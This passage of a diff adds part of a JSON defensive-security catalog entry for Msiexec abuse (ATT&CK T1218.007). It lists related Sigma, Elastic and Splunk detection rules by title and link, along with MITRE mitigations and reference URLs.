+          "T1137.006"
+        ]
+      },
+      {
+        "title": "Scheduled TaskCache Change by Uncommon Program",
+        "id": "4720b7df-40c3-48fd-bbdf-fd4b3c464f0d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_taskcache_entry.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1053",
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "COM Hijacking via TreatAs",
+        "id": "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_treatas_persistence.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1546.015"
+        ]
+      },
+      {
+        "title": "VBScript Payload Stored in Registry",
+        "id": "46490193-1b22-4c29-bdd6-5bf63907216f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_vbs_payload_stored.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1547.001"
+        ]
+      },
+      {
+        "title": "Potential WSL InstallLocation Registry Key Modification",
+        "id": "83475063-b1c8-4774-9568-69bbda71a539",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_wsl_installlocation_registry_key_modification.yml",
+        "level": "medium",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "registry_set",
+          "product": "windows"
+        },
+        "attack": [
+          "T1112",
+          "T1218"
+        ]
+      }
+    ],
+    "other_rules": [
+      "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml",
+      "https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/uninstall_app_using_msiexec.yml"
+    ]
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1218.007",
+      "description": "Restrict execution of Msiexec.exe to privileged accounts or groups that need to use it to lessen the opportunities for malicious usage."
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1218.007",
+      "description": "Consider disabling the AlwaysInstallElevated policy to prevent elevated execution of Windows Installer packages."
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/techniques/T1218/007",
+    "https://lolbas-project.github.io/lolbas/Binaries/Msiexec/",
+    "https://strontic.github.io/xcyclopedia/library/msiexec.exe-F3ED0A5EF547D0FB911158D56EF7E27F.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
